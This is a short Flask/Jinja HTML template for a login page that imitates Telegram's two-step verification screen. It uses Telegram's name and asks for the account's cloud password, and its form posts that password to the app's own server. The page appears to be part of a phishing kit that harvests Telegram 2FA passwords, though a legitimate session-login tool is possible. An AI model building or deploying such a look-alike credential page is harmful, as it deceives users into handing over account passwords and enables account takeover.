{% extends "layout.html" %} {% block content %}
<div class="container">
  <img
    src="{{ url_for('static', filename='gembok.png') }}"
    class="logo"
    alt="Telegram"
  />
  <h2>Two-step verification</h2>
  <p class="subtitle">Enter your Telegram password</p>

  <form method="POST">
    <label for="password">Password</label>
    <input
      type="password"
      name="password"
      id="password"
      placeholder="Enter your password"
      required
    />

    <button type="submit">Login</button>
  </form>

  <p class="footer-text">
    This account has 2FA enabled. Enter your password to continue.
  </p>
</div>
{% endblock %}
